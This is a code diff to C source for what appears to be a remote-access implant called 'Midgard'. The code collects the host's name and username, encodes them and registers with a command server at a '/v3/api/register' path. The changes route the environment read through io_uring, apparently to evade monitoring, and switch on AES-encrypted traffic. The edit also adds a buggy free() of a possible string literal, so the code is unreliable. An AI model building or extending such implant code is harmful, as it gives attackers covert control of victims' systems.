@@ -86,6 +86,7 @@ void command_execute(request_t *req, int sockfd, profile_t *profile, char *comma
     }
 }
 
+
 int main() {
 
     // Create UUID
@@ -124,14 +125,16 @@ int main() {
 
     char *host = read_file(&ring, "/proc/sys/kernel/hostname"); // Get system hostname
     sanitize_cmd(host);
+    
+    char *tmp_user = get_environ(&ring, (char *)"USER");
     io_uring_queue_exit(&ring);
-    char *tmp_user = getenv("USER");
 
     if (tmp_user == NULL) {
         tmp_user = "Unknown";
     }
     char *user = base64_encode((const unsigned char *)tmp_user, strlen(tmp_user));
-
+    free(tmp_user);
+    
     // Profile Config
     profile_t *profile = malloc(sizeof(profile_t));
     profile->hostname = host;
@@ -139,9 +142,9 @@ int main() {
     profile->uuid = uuid;
     profile->path = "/v3/api/register";  // Register endpoint
     profile->agent = "Midgard";
-    profile->compile_id = strdup("bf86d08b-e2f4-4bc1-878e-2c71635efaea");
+    profile->compile_id = strdup("7685152d-6b9b-4b70-acd2-679eedd8c387");
     profile->reg = (int *)1;
-    profile->aes = (int *)0;
+    profile->aes = (int *)1;
 
     // First run (no processing)
     request_t *req = calloc(1, sizeof(request_t));
@@ -164,7 +167,7 @@ int main() {
     profile->reg = 0;
 
     // Clean up variables
-    explicit_bzero(tmp_user, strlen(tmp_user));
+    // explicit_bzero(tmp_user, strlen(tmp_user));
     explicit_bzero(user, strlen(user));
     explicit_bzero(profile->compile_id, strlen(profile->compile_id));
     free(profile->compile_id);
